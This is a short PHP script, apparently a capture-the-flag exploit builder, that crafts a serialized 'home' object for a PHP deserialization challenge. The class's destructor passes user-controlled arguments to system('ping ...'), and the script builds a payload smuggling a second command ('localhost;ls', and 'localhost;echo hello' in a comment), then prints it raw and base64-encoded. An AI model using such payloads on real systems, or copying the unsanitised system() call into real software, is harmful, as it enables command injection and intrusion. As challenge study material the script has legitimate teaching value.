<?php
  class home{
    
    private $method = "ping";
    private $args = "localhost";
    function __construct($method, $args) {
        
      
        $this->method = $method;
        $this->args = $args;
    }

    function __destruct(){
        if (in_array($this->method, array("ping"))) {
            call_user_func_array(array($this, $this->method), $this->args); //call_user_func_array() expects parameter 2 to be array!!!!
        }
    } 

    function ping($host){
        echo "go into ping" . "\n";
        system("ping -c 2 $host");
    }
    function waf($str){
        $str=str_replace(' ','',$str);
        return $str;
    }

    function __wakeup(){
        foreach($this->args as $k => $v) {
//            $this->args[$k] = $this->waf(trim(mysql_escape_string($v)));
        }
    } 

    function __tostring() {
        return $this->method . $this->args;
    }
}

  $a = new home('ping', ['localhost;ls']); 
//  $a->var = 'hello'; //public属性直接设置，private需要借助set
  $b = serialize($a);
  $c = str_replace(':2:{', ':2:{', $b); //replace arg count, not work sometimes!!!
  echo $c . "\n";
  echo base64_encode($c);
  
  
//O:4:"home":2:{s:12:"%00home%00method";s:4:"ping";s:10:"%00home%00args";s:20:"localhost;echo hello";}
?>

